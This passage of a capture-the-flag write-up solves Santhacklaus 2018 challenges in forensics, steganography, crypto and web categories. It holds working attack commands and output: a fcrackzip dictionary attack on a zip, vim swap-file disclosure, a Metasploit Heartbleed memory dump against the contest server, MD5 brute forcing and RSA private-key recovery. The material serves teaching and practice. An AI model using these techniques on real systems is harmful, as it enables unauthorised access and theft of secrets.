+<p>On the right of the picture, it looks to have some characters, I framed them in red. At this point, I decided to open the WAV file in Audacity, and edit frequency range:</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/seeflag_2.gif" alt="" />
+</center></p>
+
+<h2 id="flag-19">Flag</h2>
+
+<blockquote>
+<p>IMTLD{50Sh4d3dOfS0ng}</p>
+</blockquote>
+
+<h1 id="some-chinese-stuff-challenge">Some chinese stuff challenge</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Chinese</td>
+<td>&ldquo;Fuck&rdquo;</td>
+<td>250</td>
+<td>~ 25</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-20">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_chinois.png" alt="" />
+<em>Fig 1</em>: &ldquo;Chinese&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-7">State of the art</h2>
+
+<p>We&rsquo;re starting the challenge with this text file: <a href="https://mega.nz/#!rLRVUIQR!P4T2Dg4b5jnAGJZOlgr683XsbiFmjEu1tJnNA_bN1is">https://mega.nz/#!rLRVUIQR!P4T2Dg4b5jnAGJZOlgr683XsbiFmjEu1tJnNA_bN1is</a></p>
+
+<h2 id="counting-1">Counting</h2>
+
+<p>After a few hours, I realize that there is only one thing to do, to count the different Chinese characters. Hopefully, it will unlock me.</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; #!/usr/bin/python3
+&gt;&gt;&gt; f = open('challenge.txt', 'r')
+&gt;&gt;&gt; dat = f.read()
+&gt;&gt;&gt; f.close()
+&gt;&gt;&gt; print(len(collections.Counter(dat)))
+65
+</code></pre>
+
+<p>There are 65 different chinese characters. After few moments again, I realized that the base64 charset is made of 65 characters too.</p>
+
+<h2 id="find-and-replace">Find and replace</h2>
+
+<p>I have to replace chinese characters by base64 characters. Ok, how? In fact, every characters has a Unicode code (given with ord function in python for example).</p>
+
+<p>So, you have to sort the Chinese characters and the base64 charset from the smallest to the highest. After that, let&rsquo;s try to replace each char:</p>
+
+<pre><code class="language-python">&gt;&gt;&gt; chinois = ''.join(sorted(collections.Counter(dat).keys()))
+&gt;&gt;&gt; charset = ''.join(sorted(string.ascii_letters+string.digits+'/+='))
+&gt;&gt;&gt; trantab = dat.maketrans(chinois,charset)
+&gt;&gt;&gt; print(dat.translate(trantab))
+[...]
+NyZWF0ZQAyMDE4LTEwLTI2VDEyOjQwOjU2KzAyOjAw7UNvwAAAACV0RVh0ZGF0ZTptb2RpZnkAMjAxOC0xMC0yNlQxMjo0MDo1NiswMjowMJwe13wAAAAASUVORK5CYII=
+&gt;&gt;&gt; base64.b64decode(dat.translate(trantab))
+tEXtdate:modify\x002018-10-26T12:40:56+02:00\x9c\x1e\xd7|\x00\x00\x00\x00IEND\xaeB`\x82
+</code></pre>
+
+<p>The base64 ends with <code>=</code> ! It smells good. Moreover, the decoded data contains <code>IEND</code> at the end, it looks to be a PNG file.</p>
+
+<h2 id="final-script-1">Final script</h2>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+import collections
+import string 
+import base64
+
+f = open('challenge.txt', 'r')
+dat = f.read()
+f.close()
+
+# len(string.ascii_letters)+len(string.digits)+len('/+=')
+print(len(collections.Counter(dat))) 
+
+chinois = ''.join(sorted(collections.Counter(dat).keys()))
+charset = ''.join(sorted(string.ascii_letters+string.digits+'/+='))
+trantab = dat.maketrans(chinois,charset)
+
+decoded_file = base64.b64decode(dat.translate(trantab))
+
+g = open('flag.png','wb')
+g.write(decoded_file)
+g.close()
+</code></pre>
+
+<h2 id="flag-20">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/chinois_1.png" alt="" />
+<em>Fig 2</em>: &ldquo;Chinese&rdquo; flag
+</center></p>
+
+<h1 id="volatility101">Volatility101</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Volatility101</td>
+<td>Forensic</td>
+<td>250</td>
+<td>~ 90</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-21">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_vol101.png" alt="" />
+<em>Fig 1</em>: &ldquo;Volatility101&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-8">State of the art</h2>
+
+<p>It&rsquo;s a Windows 7 memory dump:</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp imageinfo
+
+          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86 (Instantiated with WinXPSP2x86)
+                     AS Layer1 : IA32PagedMemory (Kernel AS)
+                     AS Layer2 : WindowsCrashDumpSpace32 (Unnamed AS)
+                     AS Layer3 : FileAddressSpace (/home/monique/Téléchargements/vol101/challenge.dmp)
+                      PAE type : No PAE
+                           DTB : 0x185000L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image date and time : 2018-11-06 13:24:59 UTC+0000
+     Image local date and time : 2018-11-06 14:24:59 +0100
+</code></pre>
+
+<h2 id="step-1">Step 1</h2>
+
+<p>There are two methods: a clean one and a dirty one.</p>
+
+<h3 id="clean-method">Clean method</h3>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 printkey -K &quot;ControlSet001\Control\ComputerName\ActiveComputerName&quot;
+
+Legend: (S) = Stable   (V) = Volatile
+
+----------------------------
+Registry: \REGISTRY\MACHINE\SYSTEM
+Key name: ActiveComputerName (V)
+Last updated: 2018-11-06 13:23:49 UTC+0000
+
+Subkeys:
+
+Values:
+REG_SZ        ComputerName    : (V) WELC0M3
+</code></pre>
+
+<h3 id="dirty-method">Dirty method</h3>
+
+<pre><code class="language-bash">$ strings challenge.dmp| grep &quot;COMPUTERNAME=&quot; | sort | uniq
+COMPUTERNAME=WELC0M3
+</code></pre>
+
+<blockquote>
+<p>part1 = WELC0M3</p>
+</blockquote>
+
+<h2 id="step-2">Step 2</h2>
+
+<p>I highly recommend to store all your volatility output, it&rsquo;s easier if you need additional information later.</p>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 filescan &gt; filescan.txt
+$ cat filescan.txt | grep Desktop | grep zip 
+0x000000003e067440      8      0 RWD--- \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
+</code></pre>
+
+<blockquote>
+<p>part2 = toTh3</p>
+</blockquote>
+
+<h2 id="step-3">Step 3</h2>
+
+<pre><code class="language-bash">$ volatility -f challenge.dmp --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003e067440 -D . 
+DataSectionObject 0x3e067440   None   \Device\HarddiskVolume2\Users\John\Desktop\toTh3.zip
+
+$ file file.None.0x85db26e0.dat
+file.None.0x85db26e0.dat: Zip archive data, at least v1.0 to extract
+
+$ mv file.None.0x85db26e0.dat toTh3.zip 
+$ 7za x toTh3.zip 
+[...]
+Enter password (will not be echoed):
+</code></pre>
+
+<p>Crap, password protected zip. First thing to do with an encrypted zip in a CTF, trying to bruteforce it with <code>fcrackzip</code> and <code>rockyou</code> as dictionnary:</p>
+
+<pre><code class="language-bash">$ fcrackzip -v -D -u -p rockyou.txt toTh3.zip
+found file 'part3.txt', (size cp/uc     25/    13, flags 9, chk 5069)
+checking pw jimmywimmy                              
+
+PASSWORD FOUND!!!!: pw == iamahacker
+
+$ 7za x toTh3.zip 
+[...]
+Enter password (will not be echoed): iamahacker
+Everything is Ok
+Archives with Warnings: 1
+Warnings: 1
+Size:       13
+Compressed: 4096
+
+$ cat part3.txt 
+F0r3ns1cCLUB
+</code></pre>
+
+<blockquote>
+<p>part3 = F0r3ns1cCLUB</p>
+</blockquote>
+
+<h2 id="flag-21">Flag</h2>
+
+<blockquote>
+<p>IMTLD{WELC0M3_toTh3_F0r3ns1cCLUB}</p>
+</blockquote>
+
+<h1 id="crackme-2">Crackme_2</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Crackme_2</td>
+<td>Crackme</td>
+<td>250</td>
+<td>~ 90</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-22">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_crackme2.png" alt="" />
+<em>Fig 1</em>: &ldquo;Crackme_2&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-9">State of the art</h2>
+
+<p>This binary look like <code>crackme_1</code>. Then I tried my <code>ltrace</code> and nothing&hellip;</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/crackme2_1.png" alt="" />
+<em>Fig 2</em>: ltrace test
+</center></p>
+
+<p>Nevermind, let&rsquo;s open it in IDA.</p>
+
+<h2 id="static-analysis">Static &ldquo;analysis&rdquo;</h2>
+
+<p>So, my analysis is very minimalist. I&rsquo;m not a reverser and I&rsquo;m not gonna try to understand the algorithm, but I will try to understand code flow.</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/crackme2_2.png" alt="" />
+<em>Fig 3</em>: IDA view
+</center></p>
+
+<p>Open binary and jump to the interesting string: <strong>Congratulation message</strong>.</p>
+
+<p>We can see on the picture above, on the right, a little block doing some loops, I think this block is decoding something or whatever.</p>
+
+<p>We can also see two conditions:</p>
+
+<ul>
+<li>First is probably checking for the password (correct or not)</li>
+<li>Second for decoding the password in my opinion</li>
+</ul>
+
+<p>But what could happen if I&rsquo;m changing the <code>Jump if not zero</code> into <code>Jump if zero</code> ?</p>
+
+<h2 id="byte-patching">Byte patching</h2>
+
+<p>I&rsquo;m using a little hex editor called <code>HT Editor</code>: <a href="http://hte.sourceforge.net/downloads.html">http://hte.sourceforge.net/downloads.html</a></p>
+
+<p>Btw, you can byte patch with IDA or just change the ZFlag in GDB. But I want to use HT Editor :D</p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/crackme2_3.png" alt="" />
+<em>Fig 4</em>: Addresses in IDA
+</center></p>
+
+<p>By pressing space bar, I switch from box mode to line mode, in this mode I&rsquo;m able to see addresses of each opcode.</p>
+
+<pre><code class="language-bash">$ ht crackme_2 
+</code></pre>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/crackme2_4.png" alt="" />
+<em>Fig 5</em>: Condition to edit
+</center></p>
+
+<p>According to: <a href="http://faydoc.tripod.com/cpu/jnz.htm">http://faydoc.tripod.com/cpu/jnz.htm</a></p>
+
+<p>I edit <code>75</code> hex value into <code>74</code> hex value, save, and run the program again.</p>
+
+<h2 id="flag-22">Flag</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/crackme2_5.png" alt="" />
+<em>Fig 6</em>: Flag
+</center></p>
+
+<h1 id="jeanclaude-vd">JeanClaude.VD</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>JeanClaude.VD</td>
+<td>Web-Guess</td>
+<td>250</td>
+<td>~ 55</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-23">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_jeanclaudevd.png" alt="" />
+<em>Fig 1</em>: &ldquo;JeanClaude.VD&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-10">State of the art</h2>
+
+<p>As pentester, the first file that we have to check is: <strong>robots.txt</strong></p>
+
+<pre><code class="language-bash">$ curl https://jeanclaudevd.santhacklaus.xyz/robots.txt
+todo.txt
+admin.html
+</code></pre>
+
+<h2 id="curling-all-the-things">Curling all the things</h2>
+
+<pre><code class="language-bash">$ curl https://jeanclaudevd.santhacklaus.xyz/todo.txt  
+TO CHECK  Delete the admin page (server crashed while editing)
+TO DO     Add a contact page
+TO DO     Create a Facebook page
+DONE      Watch Bloodsport
+DONE      Drink water, regularly
+</code></pre>
+
+<p>Ok, so the administrator was editing the <strong>admin.html</strong> webpage. The administrator must be a good guy, so he was probably using <strong>vim</strong>. Vim&rsquo;s temporary file has the following syntax:</p>
+
+<blockquote>
+<p>.filename.swp</p>
+</blockquote>
+
+<p>Then:</p>
+
+<pre><code class="language-bash">$ curl https://jeanclaudevd.santhacklaus.xyz/.admin.html.swp
+&lt;HTML&gt;
+&lt;HEAD&gt; &lt;TITLE&gt;Admin&lt;/TITLE&gt; &lt;/HEAD&gt;
+&lt;BODY&gt;
+  &lt;h2 class=&quot;tm-about-title&quot;&gt;Administrator&lt;/h2&gt;
+  &lt;IMG SRC=&quot;img/jcvd2.gif&quot;&gt;
+  &lt;IMG SRC=&quot;img/jcvd3.gif&quot;&gt;
+  &lt;IMG SRC=&quot;img/jcvd4.gif&quot;&gt;
+  &lt;p class=&quot;tm-about-description&quot;&gt;
+  Congratz ! Here is the flag IMTLD{ID04L0t0f1s0m3tr1cs}
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</code></pre>
+
+<h2 id="flag-23">Flag</h2>
+
+<blockquote>
+<p>IMTLD{ID04L0t0f1s0m3tr1cs}</p>
+</blockquote>
+
+<h1 id="only-numbers-here">Only numbers here</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Only numbers here</td>
+<td>Prog</td>
+<td>300</td>
+<td>~ 25</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-24">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_onlynumbers.png" alt="" />
+<em>Fig 1</em>: &ldquo;Only numbers here&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-11">State of the art</h2>
+
+<pre><code class="language-bash">$ nc 51.75.202.113 20002                        
+Welcome to this challenge !
+You must find a good string
+bitedepoulet
+The string must end with &quot;Pinkflood&quot;
+</code></pre>
+
+<h2 id="find-the-hash">Find the hash</h2>
+
+<p>This challenge broke my brain I think. I tried looooot of things, and the answer remains the same. At the end, I think about <code>Type juggling attack</code> in PHP. What would happen if I found a text ending with Pinkflood and gives me a MD5 hash containing only numbers?</p>
+
+<h2 id="scripting">Scripting</h2>
+
+<pre><code class="language-python">#!/usr/bin/pypy
+
+import hashlib
+
+i = 0
+while 1:
+  a = hashlib.md5(str(i)+&quot;Pinkflood&quot;).hexdigest()
+  if a.isdigit():
+    print(&quot;{0}Pinkflood : {1}&quot;.format(i, a))
+  i = i+1
+</code></pre>
+
+<p><code>pypy</code> is fastest than <code>python2</code>.</p>
+
+<pre><code class="language-bash">$ ./bf.py 
+1140633Pinkflood : 26062149783494508159682139582576
+2293089Pinkflood : 30779574770132845832149204470045
+18696276Pinkflood : 73885183743190612146875247615753
+18716187Pinkflood : 12486779424170090450458074623834
+21870313Pinkflood : 63660919203685129956461516827438
+23342402Pinkflood : 40264813326696109876977252058734
+26254213Pinkflood : 44900784602150912181870126246632
+28726247Pinkflood : 50604678152856163642122024973076
+31248448Pinkflood : 72452559495740519280516997363235
+
+$ nc 51.75.202.113 20002
+Welcome to this challenge !
+You must find a good string
+1140633Pinkflood
+Congratz!!
+Flag : IMTLD{Brut3F0rc31sTh3N3wBl4ck}
+</code></pre>
+
+<h2 id="flag-24">Flag</h2>
+
+<blockquote>
+<p>Flag : IMTLD{Brut3F0rc31sTh3N3wBl4ck}</p>
+</blockquote>
+
+<h1 id="be-my-valentine">Be my valentine</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>Be my valentine</td>
+<td>Web</td>
+<td>400</td>
+<td>~ 40</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-25">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_valentine.png" alt="" />
+<em>Fig 1</em>: &ldquo;Be my valentine&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-12">State of the art</h2>
+
+<p>I immediatly thought to heartbleed. I went on the website, and the SSL certificate was different than others web challenge&hellip;</p>
+
+<p><center>
+<img src="https://media.giphy.com/media/l0HlMwZ0zBZxM2ukw/giphy.gif" alt="" />
+</center></p>
+
+<h2 id="metasploit-time">Metasploit time</h2>
+
+<pre><code class="language-bash">$ sudo  docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit
+
+metasploitdocker $ msfconsole
+
+msf5 search heartbleed
+[!] Module database cache not built yet, using slow search
+
+Matching Modules
+================
+
+   Name                                              Disclosure Date  Rank    Description
+   ----                                              ---------------  ----    -----------
+   auxiliary/scanner/ssl/openssl_heartbleed          2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Information Leak
+   auxiliary/server/openssl_heartbeat_client_memory  2014-04-07       normal  OpenSSL Heartbeat (Heartbleed) Client Memory Exposure
+
+
+msf5 use auxiliary/scanner/ssl/openssl_heartbleed
+
+msf5 auxiliary(auxiliary/scanner/ssl/openssl_heartbleed) &gt; show actions
+
+Auxiliary actions:
+
+   Name     Description
+   ----     -----------
+   Capture  
+
+
+msf5 auxiliary(auxiliary/scanner/ssl/openssl_heartbleed) &gt; set action DUMP
+action =&gt; DUMP
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set RHOSTS 51.75.202.113
+RHOSTS =&gt; 51.75.202.113
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set RPORT 1073
+RPORT =&gt; 1073
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set TLS_VERSION 1.2
+TLS_VERSION =&gt; 1.2
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set VERBOSE true
+VERBOSE =&gt; true
+
+msf5 auxiliary(scanner/ssl/openssl_heartbleed) &gt; run
+[...]
+[*] 51.75.202.113:1073    - Printable info leaked:
+......\....&lt;.!......~..rO..3....E...C&amp;..f.....&quot;.!.9.8.........5.............................3.2.....E.D...../...A.......................................w-form-urlencoded....IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}....'T].T...QT......4.2.....................................................&quot;. .....................................Mon, 10 Dec
+[...]
+</code></pre>
+
+<h2 id="flag-25">Flag</h2>
+
+<blockquote>
+<p>IMTLD{I_Cl34n3d_Y0ur_D1rtY_H34rT_Sw33tY}</p>
+</blockquote>
+
+<h1 id="randomscretmessage">RandomScretmessAge</h1>
+
+<p><center></p>
+
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Challenge</th>
+<th>Category</th>
+<th>Points</th>
+<th>Solves</th>
+</tr>
+</thead>
+
+<tbody>
+<tr>
+<td>Santhacklaus</td>
+<td>RandomScretmessAge</td>
+<td>Crypto</td>
+<td>400</td>
+<td>~ 40</td>
+</tr>
+</tbody>
+</table>
+
+<p></center></p>
+
+<h2 id="statement-26">Statement</h2>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/statement_randomsecretmessage.png" alt="" />
+<em>Fig 1</em>: &ldquo;RandomScretmessAge&rdquo; statement
+</center></p>
+
+<h2 id="state-of-the-art-13">State of the art</h2>
+
+<p>The archive contains 3 files:</p>
+
+<ul>
+<li>encryptedKey</li>
+<li>encryptedMessage</li>
+<li>public.key</li>
+</ul>
+
+<p>Obviously the entry point is the public key. Let&rsquo;s try to factor in the modulo of the key:</p>
+
+<pre><code class="language-bash">$ openssl rsa -in public.key -pubin -text -modulus 
+RSA Public-Key: (2131 bit)
+Modulus:
+    05:e4:14:c3:38:98:4d:4b:7d:f2:be:20:93:f7:f7:
+    83:48:fa:b0:bc:2c:ad:09:57:0e:41:08:f8:dd:a0:
+    98:0a:4f:7e:66:a6:b8:5d:1c:fe:d4:43:b7:43:c8:
+    c5:5b:8c:c2:54:9b:86:bf:84:f2:14:c7:a4:2f:aa:
+    7a:cc:8c:a2:7b:9d:76:9e:f4:43:67:da:3d:0a:f8:
+    e2:07:6c:48:ef:70:6f:a7:be:f7:81:61:5a:26:d9:
+    e0:36:84:af:62:52:a9:01:ac:ad:07:e7:b9:7f:14:
+    22:99:65:d1:83:ad:26:7a:eb:ff:0e:c5:ed:14:ac:
+    33:f0:1d:6f:a2:3d:9e:14:49:f7:ec:a7:c7:ce:8c:
+    d3:c2:4a:d0:64:ec:f5:f0:c5:49:70:8d:b6:cc:c0:
+    f0:8c:55:4a:12:cb:a4:8c:d5:6a:0f:85:1c:f7:4a:
+    68:25:b4:15:d3:b6:41:86:90:ed:d3:70:5d:b3:dc:
+    b4:fe:1d:78:9f:6e:d5:4b:24:4b:c3:89:51:cd:f7:
+    c2:11:05:9d:9f:ee:35:9a:12:10:0f:9e:d4:7d:a7:
+    4d:33:4b:9c:bf:1c:91:ab:86:fc:b0:63:a7:70:f6:
+    c4:70:bd:cd:60:eb:f9:62:c8:41:bb:ad:e5:c4:71:
+    51:40:37:48:44:f2:9a:5d:51:78:3b:08:6b:ab:fa:
+    5c:92:cc:1b:aa:0f:56:25:2f:75:64:33
+Exponent: 65537 (0x10001)
+Modulus=5E414C338984D4B7DF2BE2093F7F78348FAB0BC2CAD09570E4108F8DDA0980A4F7E66A6B85D1CFED443B743C8C55B8CC2549B86BF84F214C7A42FAA7ACC8CA27B9D769EF44367DA3D0AF8E2076C48EF706FA7BEF781615A26D9E03684AF6252A901ACAD07E7B97F14229965D183AD267AEBFF0EC5ED14AC33F01D6FA23D9E1449F7ECA7C7CE8CD3C24AD064ECF5F0C549708DB6CCC0F08C554A12CBA48CD56A0F851CF74A6825B415D3B6418690EDD3705DB3DCB4FE1D789F6ED54B244BC38951CDF7C211059D9FEE359A12100F9ED47DA74D334B9CBF1C91AB86FCB063A770F6C470BDCD60EBF962C841BBADE5C4715140374844F29A5D51783B086BABFA5C92CC1BAA0F56252F756433
+writing RSA key
+-----BEGIN PUBLIC KEY-----
+MIIBLDANBgkqhkiG9w0BAQEFAAOCARkAMIIBFAKCAQsF5BTDOJhNS33yviCT9/eD
+SPqwvCytCVcOQQj43aCYCk9+Zqa4XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyi
+e512nvRDZ9o9CvjiB2xI73Bvp773gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60m
+euv/DsXtFKwz8B1voj2eFEn37KfHzozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVq
+D4Uc90poJbQV07ZBhpDt03Bds9y0/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57U
+fadNM0ucvxyRq4b8sGOncPbEcL3NYOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pc
+kswbqg9WJS91ZDMCAwEAAQ==
+-----END PUBLIC KEY-----
+
+$ python -c &quot;print(int('5E414C338984D4B7DF2BE2093F7F78348FAB0BC2CAD09570E4108F8DDA0980A4F7E66A6B85D1CFED443B743C8C55B8CC2549B86BF84F214C7A42FAA7ACC8CA27B9D769EF44367DA3D0AF8E2076C48EF706FA7BEF781615A26D9E03684AF6252A901ACAD07E7B97F14229965D183AD267AEBFF0EC5ED14AC33F01D6FA23D9E1449F7ECA7C7CE8CD3C24AD064ECF5F0C549708DB6CCC0F08C554A12CBA48CD56A0F851CF74A6825B415D3B6418690EDD3705DB3DCB4FE1D789F6ED54B244BC38951CDF7C211059D9FEE359A12100F9ED47DA74D334B9CBF1C91AB86FCB063A770F6C470BDCD60EBF962C841BBADE5C4715140374844F29A5D51783B086BABFA5C92CC1BAA0F56252F756433',16))&quot;
+
+230152398896492262062917148918939369015014118008521754032548535722623568807836513537632397474114638982139817176242926038563922451374734906474723194699186733981993080692084118938543671681218415674853397015772305693193080495161797442964189614747331265533790868829904995717880910750965489149821260489435560109415967653557264841805977201140711694719161091225610507928743832862244878002681898338427785672707004742713481053176255521113862812632505222790970858405544033198948553254981826681196797972439220360641118375422622406636642890247240882949568102579346403837896130334566480801945922807178359120965083164249882668632540394096519286553193047091
+</code></pre>
+
+<p>Go on: <a href="http://factordb.com">http://factordb.com</a></p>
+
+<p><center>
+<img src="/img/writeups/santhacklaus2018/randommessage_1.png" alt="" />
+<em>Fig 2</em>: Factors
+</center></p>
+
+<pre><code class="language-raw">P = 6369464272063091
+
+Q = 36133713773379110639156260809245710667249975097562535767006217344639401652545429184561670432654474685916444326329643261647839089779277922050876490310749777502134887001325019251594457313507648444893716167741071873690247544507901124644795185514523048177087583983446883357725075474454793584100416963202502865501677869411542007837316840565244878404910099258998767621377489314574579157689021034325071357685826056186366281177470036065239593291043613159095152517361284436054014254878411360973917732537367613163935385261628257586857455858546412331928149149513390186719329954080661111495911977853224786621480771096967827579842274824001
+</code></pre>
+
+<h2 id="recover-the-private-key">Recover the private key</h2>
+
+<p>If the modulo (N) in RSA is not a prime number, then you can factor recover <strong>P</strong>  and <strong>Q</strong>, and then generate the private key. I used <code>rsactftool</code> to do that:</p>
+
+<pre><code class="language-bash">$ python2 ./RsaCtfTool.py --publickey ../public.key --private
+
+-----BEGIN RSA PRIVATE KEY-----
+MIIEUQIBAAKCAQsF5BTDOJhNS33yviCT9/eDSPqwvCytCVcOQQj43aCYCk9+Zqa4
+XRz+1EO3Q8jFW4zCVJuGv4TyFMekL6p6zIyie512nvRDZ9o9CvjiB2xI73Bvp773
+gWFaJtngNoSvYlKpAaytB+e5fxQimWXRg60meuv/DsXtFKwz8B1voj2eFEn37KfH
+zozTwkrQZOz18MVJcI22zMDwjFVKEsukjNVqD4Uc90poJbQV07ZBhpDt03Bds9y0
+/h14n27VSyRLw4lRzffCEQWdn+41mhIQD57UfadNM0ucvxyRq4b8sGOncPbEcL3N
+YOv5YshBu63lxHFRQDdIRPKaXVF4Owhrq/pckswbqg9WJS91ZDMCAwEAAQKCAQsA
+jkcjL+i2g9ouvR+7+QpAyRGGi77ukvrGf0sQBKu9qGkm6iVNVe8Aroyrla7Hhuyk
+uSwVHlg2JxDWHKpLEMh43PFbG2Fky/Ezer6jnTuJs5b9NOUiEB7TWq2pKZtRLiVz
+CAkYMVeT2VHbWOqU7VZr66P/oghvcSUpni5kSACDsIvWJNr5/nUDGBnSnjWMVCF9
+W9cpElxop/wiw/1IOg/uYK2xHv5dDCK1yPPsiSj8ZLIT0RUciUSUQmXPQxSa9vIN
+4zlRD0AFSLBXo0AiXIF5c/hLTOKeOUD9Q07O8/fkEQz9d7CQIDlwMELKROxk7H6K
+y1rtBmo3VHdh/B/CoLpFx93+crmaSOW2WYECBxag/ndYinMCggEEQqTif+tJiKn4
+fG5uGuMBVqBnT5YFq6mwa73c6eR5i1jsN0m2wNmnru4dODZn96Y2t58kGnNMrAZr
+BqPg/5Hr/P0/p07nv3+KWR1Y2LZwehkKmBcJMRMU7bQeE5jgGutHBN3eVWphGzM0
+jg3FQbJyVfEGoL5P8YmbOEnbaPHbtEInOXS587h60ZngGDe4zpjRj9HXq13fSbYi
+3LbuJrgqru0E0u/z49PQkQyPwNMTYLFio2ekm23o/inZZAHEHPv86DIZIgJDNa1n
+6Vr7qzRMI3c42LIpFUwC0m0elv9Pj6Szd5v5Xv1wzlw7GqIBdGLxM5hVmJMiPhil
+721SVCOknEPMj0ECBxNbYnG65qsCggEEJET+K+YOT/1JCddDvwg6Sz3i29Jm5aTl
+Kc3bs8MvTuInNHO+rTgHZVGbv2MEtCfWcZp/mJGVca3Qg32ezxhIWZguE00DHRo5
+XgR1vQOVNS35sQoga3/aDP/QupOhq6TOMtzYyp2pmZcFjCX8a6PFS/Zvx/2rHmXo
+fvrbGUM/cdvq4v8e0IBe/0GCT0vMHUvYCTCH8nCVO9WPJZW9CH+EY00FKhODJUO6
+p6Yxehyl2CLR7uJSGHD5s5FtCVtYsvmFC41wVizrDQSBn+NvQh6lLUwOOQjFCR0k
+EAdo9X6feyqErZzKW6MMyJIzbGws5H2QjabjNrUklqztad+SRc5cINtZMcECBxBu
+4HDBiUQ=
+-----END RSA PRIVATE KEY-----
+</code></pre>
+
+<p>Now, we got an encrypted key and the encrypted flag.</p>
+
+<p>It reminds me a little ransomware tricks: Encrypt data with a secret key in AES and encrypt the secret key with a public key in RSA and send it to the command and control server.</p>
+
+<p>The attacker has to decrypt the encrypted AES secret key with his RSA private key.</p>
+
+<h2 id="recover-the-secret-key">Recover the secret key</h2>
+
+<pre><code class="language-bash">$ openssl rsautl -decrypt -in encryptedKey -inkey priv.key
+My_WiF3_d0eSn’T_h4v3_T0_kN0w_Th1s_Symm3tr1k_k3Y
+</code></pre>
+
+<p>OpenSSL did the job. By guessing, I think the symmetrical cryptography used is AES-256-CBC.</p>
+
+<p>Btw, the encryptMessage file contains OpenSSL magic number:</p>
+
+<pre><code class="language-bash">$ hexdump -C encryptedMessage 
+00000000  53 61 6c 74 65 64 5f 5f  a9 18 48 41 30 3a 91 f4  |Salted__..HA0:..|
+00000010  4a d7 9d 2a 1a 49 4d 29  3c a0 54 f3 8b 7d e5 5e  |J..*.IM)&lt;.T..}.^|
